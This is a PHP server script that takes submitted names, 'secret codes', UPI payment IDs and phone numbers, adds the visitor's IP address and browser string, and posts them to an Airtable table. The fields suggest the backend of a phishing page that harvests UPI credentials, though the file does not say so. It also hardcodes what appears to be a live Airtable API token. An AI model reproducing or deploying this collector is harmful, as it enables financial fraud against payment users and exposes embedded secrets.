<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Get input data - try JSON first, then form data
$input = null;
$content_type = $_SERVER['CONTENT_TYPE'] ?? '';

if (strpos($content_type, 'application/json') !== false) {
    $input = json_decode(file_get_contents('php://input'), true);
} else {
    // Handle form data
    $input = $_POST;
}

if (!$input) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid input data']);
    exit;
}

// Validate required fields
$required_fields = ['name', 'secretCode', 'upiId', 'phoneNumber'];
foreach ($required_fields as $field) {
    if (empty($input[$field])) {
        http_response_code(400);
        echo json_encode(['error' => "Missing required field: $field"]);
        exit;
    }
}

// Add default values for missing fields
if (empty($input['ipAddress'])) {
    $input['ipAddress'] = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}
if (empty($input['browserInfo'])) {
    $input['browserInfo'] = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
}

// Airtable configuration
$airtable_base_id = 'appGY1EL9Ma68WeAH';
$airtable_table_name = 'DATA';
$airtable_api_key = 'pat6AvVXQl4S5zdKz.d920e0f3e92785755518ce0c2e263176de75f8923cf2e408926b8144544b59eb';

// Prepare data for Airtable
$airtable_data = [
    'records' => [
        [
            'fields' => [
                'NAME' => $input['name'],
                'SECRET CODE' => $input['secretCode'],
                'UPI ID' => $input['upiId'],
                'Phone Number' => $input['phoneNumber'],
                'IP Address' => $input['ipAddress'],
                'Browser Info' => $input['browserInfo']
            ]
        ]
    ]
];

// Make request to Airtable
$url = "https://api.airtable.com/v0/{$airtable_base_id}/{$airtable_table_name}";
$headers = [
    'Authorization: Bearer ' . $airtable_api_key,
    'Content-Type: application/json'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($airtable_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curl_error = curl_error($ch);
curl_close($ch);

// Handle response
if ($curl_error) {
    http_response_code(500);
    echo json_encode(['error' => 'CURL Error: ' . $curl_error]);
    exit;
}

if ($http_code >= 200 && $http_code < 300) {
    // Success
    echo json_encode([
        'success' => true,
        'message' => 'Data submitted successfully',
        'airtable_response' => json_decode($response, true)
    ]);
} else {
    // Error
    http_response_code($http_code);
    echo json_encode([
        'error' => 'Airtable API Error',
        'http_code' => $http_code,
        'response' => $response
    ]);
}
?>
